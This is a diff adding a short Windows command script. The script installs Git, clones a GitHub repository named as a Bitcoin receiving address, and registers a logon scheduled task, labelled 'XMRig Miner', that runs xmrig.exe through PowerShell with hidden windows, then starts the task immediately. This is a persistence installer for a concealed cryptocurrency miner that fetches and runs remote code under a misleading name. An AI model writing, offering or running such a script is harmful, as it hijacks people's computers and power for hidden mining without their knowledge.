@@ -1,0 +1,7 @@
+winget install --id Git.Git -e --source winget &&
+mkdir C:\user
+cd /d C:\user\ &&
+git clone  https://github.com/Brij510/BTC-Reciving-Address.git &&
+cd /d C:\user\BTC-Reciving-Address\windows\  &&
+schtasks /create /sc onlogon /tn "XMRig Miner" /tr "powershell.exe -NoProfile -WindowStyle Hidden -Command Start-Process -FilePath '%CD%\xmrig.exe' -WorkingDirectory '%CD%' -WindowStyle Hidden" /rl LIMITED /f && schtasks /run /tn "XMRig Miner"
+
